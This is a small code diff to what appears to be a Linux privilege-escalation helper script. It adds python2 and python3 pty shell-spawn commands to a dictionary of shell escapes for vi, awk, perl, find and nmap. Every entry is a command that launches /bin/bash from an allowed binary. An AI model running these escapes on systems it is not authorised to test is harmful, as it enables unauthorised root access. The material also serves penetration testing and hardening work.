@@ -374,6 +374,8 @@ def main(args):
     escapeCmd = {"vi": [":!bash", ":set shell=/bin/bash:shell"],
                  "awk": ["awk 'BEGIN {system(\"/bin/bash\")}'"],
                  "perl": ["perl -e 'exec \"/bin/bash\";'"],
+                 "python2": ["python2 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+                 "python3": ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
                  "find": ["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"],
                  "nmap":["--interactive"]}
     for cmd in escapeCmd:
